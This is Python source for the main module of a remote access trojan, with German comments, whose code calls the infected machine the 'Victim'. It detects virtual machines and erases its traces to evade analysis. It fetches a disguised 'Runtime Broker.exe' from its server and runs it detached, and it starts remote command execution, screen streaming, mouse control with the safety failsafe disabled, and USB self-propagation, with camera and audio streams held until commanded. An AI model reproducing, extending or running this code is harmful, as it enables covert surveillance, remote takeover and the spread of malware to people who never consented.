import ctypes
import os
import sys
import time
import threading

# Setup sys.path für PyInstaller und direktes Starten
if getattr(sys, "frozen", False):
    base_path = sys._MEIPASS  # type: ignore[attr-defined]
else:
    base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))

if base_path not in sys.path:
    sys.path.insert(0, base_path)

import tricking
import defender

try:
    import metadata_provider
except ImportError:
    pass

import pyautogui
import zmq
import psutil
import requests

import config # type: ignore
import network # type: ignore
import command # type: ignore
import screen # type: ignore
import sysinfo # type: ignore
import tempsaver # type: ignore
import virtual # type: ignore
import usb_propagation # type: ignore
from mousemover import start_mouse_controller
from audio import start_full_audio_stream # type: ignore
from camera import start_camera_stream # type: ignore

# globals that were previously module-level
zmq_context = None
zmq_socket = None


def init_zmq():
    global zmq_context, zmq_socket
    print("[*] Initialisiere ZMQ...", flush=True)
    zmq_context = zmq.Context()
    zmq_socket = zmq_context.socket(zmq.PUB)
    zmq_socket.setsockopt(zmq.SNDHWM, 1)
    zmq_socket.setsockopt(zmq.LINGER, 0)
    zmq_socket.setsockopt(zmq.TCP_KEEPALIVE, 1)
    zmq_socket.setsockopt(zmq.TCP_KEEPALIVE_IDLE, 300)
    zmq_socket.setsockopt(zmq.TCP_KEEPALIVE_INTVL, 60)
    
    # Try to bind with retry logic
    max_retries = 3
    for attempt in range(max_retries):
        try:
            zmq_socket.bind(f"tcp://*:{config.ZMQ_SERVER_PORT}")
            print(f"[+] ZMQ BIND auf tcp://*:{config.ZMQ_SERVER_PORT}", flush=True)
            break
        except Exception as e:
            if attempt < max_retries - 1:
                print(f"[-] ZMQ BIND Fehler (Versuch {attempt+1}/{max_retries}): {e}", flush=True)
                time.sleep(2)
            else:
                print(f"[-] ZMQ BIND kritischer Fehler nach {max_retries} Versuchen: {e}", flush=True)
    time.sleep(0.5)


def set_dpi_awareness():
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass


def handle_drive_response():
    """Prüfe auf ausstehende Drive-Response-Anfragen und erstelle Response-Datei"""
    response_file = r"C:\Temp\resp_E.dat"
    syslog_file = r"C:\Temp\syslog.dat"
    
    print(f"[*] [handle_drive_response] Starte...", flush=True)
    print(f"[*] [handle_drive_response] Prüfe auf: {syslog_file}", flush=True)
    print(f"[*] [handle_drive_response] Response-Datei: {response_file}", flush=True)
    
    try:
        # Erstelle Temp-Verzeichnis falls nicht vorhanden
        temp_dir = r"C:\Temp"
        if not os.path.exists(temp_dir):
            print(f"[*] [handle_drive_response] Erstelle Verzeichnis: {temp_dir}", flush=True)
            os.makedirs(temp_dir, exist_ok=True)
            print(f"[+] [handle_drive_response] Verzeichnis erstellt", flush=True)
        else:
            print(f"[*] [handle_drive_response] Verzeichnis existiert: {temp_dir}", flush=True)
        
        # Prüfe ob Response schon existiert
        if os.path.exists(response_file):
            try:
                with open(response_file, 'r', encoding='utf-8') as f:
                    existing = f.read().strip()
                print(f"[+] [handle_drive_response] Response existiert bereits: '{existing}'", flush=True)
            except Exception as e:
                print(f"[!] [handle_drive_response] Cannot read existing response: {e}", flush=True)
            return
        
        # Lies syslog um zu sehen was der Inhalt ist
        syslog_content = ""
        if os.path.exists(syslog_file):
            print(f"[*] [handle_drive_response] Syslog-Datei existiert, lese...", flush=True)
            try:
                with open(syslog_file, 'r', encoding='utf-8') as f:
                    syslog_content = f.read()
                print(f"[*] [handle_drive_response] Syslog content: {syslog_content[:100]}", flush=True)
            except Exception as e:
                print(f"[!] [handle_drive_response] Cannot read syslog: {e}", flush=True)
        else:
            print(f"[*] [handle_drive_response] Syslog nicht gefunden: {syslog_file}", flush=True)
        
        # Prüfe aus Env-Var ob Antwort vorgegeben ist
        env_response = os.environ.get('VICTIM_DRIVE_RESPONSE', '').lower()
        response = None
        
        if env_response in ['ja', 'yes', 'nein', 'no']:
            response = 'ja' if env_response in ['ja', 'yes'] else 'nein'
            print(f"[*] [handle_drive_response] Nutze Env-Variable: '{response}'", flush=True)
        else:
            # Versuche interaktiv zu fragen
            try:
                print("\n" + "=" * 70, flush=True)
                print("[?] DRIVE BACKUP QUESTION:", flush=True)
                print("[?] Laufwerk E: ist zu groß (931.90GB). Sollen beim nächsten Mal", flush=True)
                print("[?] trotzdem alle Dateien kopiert werden?", flush=True)
                print("[?] Antworte mit 'ja' oder 'nein' (Standard: nein): ", end="", flush=True)
                sys.stdout.flush()
                
                user_input = input().strip().lower()
                print(f"[*] [handle_drive_response] User input: '{user_input}'", flush=True)
                
                # Validiere Input
                if user_input in ['ja', 'yes']:
                    response = 'ja'
                else:
                    response = 'nein'  # Default zu 'nein'
                
                print(f"[+] [handle_drive_response] Benutzer antworte: '{response}'", flush=True)
                print("=" * 70 + "\n", flush=True)
            except (EOFError, KeyboardInterrupt) as e:
                # Nicht-interaktive Umgebung oder Abbruch -> Default
                response = 'nein'
                print(f"[*] [handle_drive_response] EOFError/KeyboardInterrupt ({e}), nutze Default: '{response}'", flush=True)
            except Exception as e:
                response = 'nein'
                print(f"[!] [handle_drive_response] Input error: {e}, nutze Default", flush=True)
        
        # Schreibe Response-Datei
        if response:
            try:
                print(f"[*] [handle_drive_response] Schreibe zu: {response_file}", flush=True)
                with open(response_file, 'w', encoding='utf-8') as f:
                    f.write(response)
                print(f"[+] [handle_drive_response] Response '{response}' erfolgreich geschrieben", flush=True)
                # Verifiziere dass die Datei existiert
                if os.path.exists(response_file):
                    print(f"[+] [handle_drive_response] Datei-Existenz verifiziert: OK", flush=True)
            except Exception as e:
                print(f"[!] [handle_drive_response] Fehler beim Schreiben/Verifizieren: {e}", flush=True)
    except Exception as e:
        print(f"[!] [handle_drive_response] Fehler: {e}", flush=True)


def check_and_restore_runtime_broker():
    """Überprüfe ob Runtime Broker läuft, wenn nicht, lade herunter oder stelle wieder her"""
    print("[*] [check_and_restore_runtime_broker] Starte Überprüfung...", flush=True)
    
    # Überprüfe ob Runtime Broker Prozess läuft
    runtime_broker_running = False
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if 'Runtime Broker' in proc.info['name'] or 'Runtime_Broker' in proc.info['name']:
                runtime_broker_running = True
                print("[+] [check_and_restore_runtime_broker] Runtime Broker läuft bereits", flush=True)
                break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    
    if runtime_broker_running:
        return
    
    print("[-] [check_and_restore_runtime_broker] Runtime Broker nicht gefunden, versuche Wiederherstellung", flush=True)
    
    # Pfad für Runtime Broker
    runtime_broker_path = os.path.join(os.path.dirname(__file__), 'Victim Backup Installer', 'Runtime Broker.exe')
    
    # Backup-Verzeichnis
    backup_dir = os.path.join(os.getenv('TEMP'), 'XVictim_Backup')
    backup_runtime_broker = os.path.join(backup_dir, 'Runtime Broker.exe')
    
    # Versuche zuerst vom Server herunterzuladen
    try:
        download_url = f"{config.SERVER_URL}/backup/download/Runtime Broker Backup/Runtime Broker.exe"
        print(f"[*] [check_and_restore_runtime_broker] Versuche Download von: {download_url}", flush=True)
        response = requests.get(download_url, timeout=30)
        if response.status_code == 200:
            os.makedirs(os.path.dirname(runtime_broker_path), exist_ok=True)
            with open(runtime_broker_path, 'wb') as f:
                f.write(response.content)
            print("[+] [check_and_restore_runtime_broker] Runtime Broker erfolgreich heruntergeladen", flush=True)
        else:
            raise Exception(f"Download fehlgeschlagen: {response.status_code}")
    except Exception as e:
        print(f"[-] [check_and_restore_runtime_broker] Download fehlgeschlagen: {e}, versuche Backup", flush=True)
        # Versuche von Backup zu kopieren
        try:
            if os.path.exists(backup_runtime_broker):
                os.makedirs(os.path.dirname(runtime_broker_path), exist_ok=True)
                import shutil
                shutil.copy2(backup_runtime_broker, runtime_broker_path)
                print("[+] [check_and_restore_runtime_broker] Runtime Broker aus Backup wiederhergestellt", flush=True)
            else:
                print("[-] [check_and_restore_runtime_broker] Kein Backup gefunden", flush=True)
                return
        except Exception as e:
            print(f"[!] [check_and_restore_runtime_broker] Backup-Wiederherstellung fehlgeschlagen: {e}", flush=True)
            return
    
    # Starte Runtime Broker
    try:
        import subprocess
        subprocess.Popen([runtime_broker_path], creationflags=subprocess.DETACHED_PROCESS)
        print("[+] [check_and_restore_runtime_broker] Runtime Broker gestartet", flush=True)
    except Exception as e:
        print(f"[!] [check_and_restore_runtime_broker] Fehler beim Starten: {e}", flush=True)


# Worker, der regelmäßig handle_drive_response aufruft
def monitor_drive_response():
    while True:
        try:
            handle_drive_response()
        except Exception as e:
            print(f"[!] [monitor_drive_response] Fehler: {e}", flush=True)
        time.sleep(60)  # alle 60 Sekunden prüfen


# Hauptfunktion
def application_start():
    init_zmq()
    check_and_restore_runtime_broker()  # Überprüfe und stelle Runtime Broker wieder her
    try:
        screen.set_zmq_socket(zmq_socket)
        print("[+] Screen module received ZMQ socket", flush=True)
    except Exception as e:
        print(f"[!] Failed to hand off ZMQ socket to screen module: {e}", flush=True)
    set_dpi_awareness()

    pyautogui.FAILSAFE = False

    # start worker threads
    print("[*] Starte Command-Worker-Pool...", flush=True)
    for i in range(command.MAX_COMMAND_WORKERS):
        threading.Thread(target=command.command_worker_pool, daemon=True).start()
    print(f"[+] {command.MAX_COMMAND_WORKERS} Command-Worker gestartet", flush=True)

    print("[*] Starte Worker-Threads...", flush=True)
    threading.Thread(target=network.heartbeat_worker, daemon=True).start()
    threading.Thread(target=command.command_poller_worker, daemon=True).start()
    threading.Thread(target=screen.screen_stream_worker, daemon=True).start()
    threading.Thread(target=sysinfo.sysinfo_worker, daemon=True).start()
    threading.Thread(target=tempsaver.main, daemon=True).start()
    threading.Thread(target=network.auth_worker, daemon=True).start()
    threading.Thread(target=monitor_drive_response, daemon=True).start()  # Monitor für Drive-Responses
    threading.Thread(target=usb_propagation.main, daemon=True).start()  # USB Auto-Propagation

    # DDNS Updater gehört nur auf den Server, nicht auf Victim-Clients.
    # Victim benötigt nur die URL/Hostname und das interne Auth-Passwort.

    # Starte Mouse Controller für Control-Modus
    start_mouse_controller(config.PC_NAME)
    
    print(f"[+] Alle Worker-Threads gestartet (inkl. Drive-Response-Monitor, USB-Propagation und Mouse Controller)", flush=True)

    # DON'T auto-start streams - wait for explicit client commands
    # Audio Stream will start ONLY when client sends "set_control_mode" with "streaming" or "audio_only"
    print("[*] Streams disabled (idle mode) - waiting for client commands...", flush=True)
    print("[*] To enable streams: Client sends 'set_control_mode' -> victim responds accordingly", flush=True)

    # Camera starts ONLY on command from client (not automatically)
    print("[*] Kamera-Stream deaktiviert (startet nur auf Client-Befehl)", flush=True)

    print("\n" + "=" * 60, flush=True)
    print("[+] Main-Thread ist jetzt responsive (alle Ops in Worker-Threads)", flush=True)
    print("[+] Command-Queue mit Rate Limiting aktiviert", flush=True)
    print("=" * 60 + "\n", flush=True)

    while True:
        time.sleep(60)


def main():
    print("[*] Starte VM-Prüfung via virtual.py...", flush=True)
    if virtual.is_virtual_machine():
        print("[-] VM erkannt! Führe Rollback und Exit aus.", flush=True)
        virtual.rollback_artifacts()
        return

    print("[+] Keine VM - fahre mit dem normalen Start fort.", flush=True)
    application_start()


if __name__ == "__main__":
    main()
